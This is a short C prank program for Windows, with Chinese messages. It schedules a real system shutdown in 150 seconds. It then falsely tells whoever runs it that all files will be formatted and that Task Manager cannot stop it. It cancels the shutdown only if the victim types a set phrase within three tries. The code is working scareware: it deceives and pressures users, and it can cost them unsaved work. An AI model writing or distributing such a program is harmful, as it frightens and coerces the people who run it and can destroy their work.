#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<windows.h>
main()
{
	int counter=1,i;
	char ch[100];
	system("shutdown -s -t 150");
	Sleep(6000);
	printf("嘿嘿，你摊上事儿了\n");
	Sleep(4000);
	printf("不好意思\n");
	Sleep(4000);
	printf("你的电脑将会在150秒后自动关机并格式化所有文件.......\n");
	Sleep(4000);
	printf("只有输入“我要玩微乐”才可停止关机程序\n");
	Sleep(4000);
	printf("任务管理器是关不掉的哦\n");
	Sleep(4000);
	printf("你只有3次机会\n");
	Sleep(4000);
	printf("如果直接关闭窗口你就只有哭的机会了.......\n");
	Sleep(4000);
	printf("赶快说吧，时间不多了\n");
	do
	{
		gets(ch);
		i=3-counter;
		counter ++;
		if(strcmp(ch,"我要玩微乐")==0)
		{
		printf("给我当粉丝吧哈哈哈哈哈哈哈\n",i);
		system("shutdown -a");
		exit(0);
		}
		else if (counter>3)
		{ printf("你的机会已经用完，请等待........\n");
		break;
		}
		else if(strcmp(ch,"我要玩微乐")!=0)
		printf("不玩?\n你浪费了一次宝贵的机会\n你还有%d次机会\n",i);
		
	}while(1);
} 



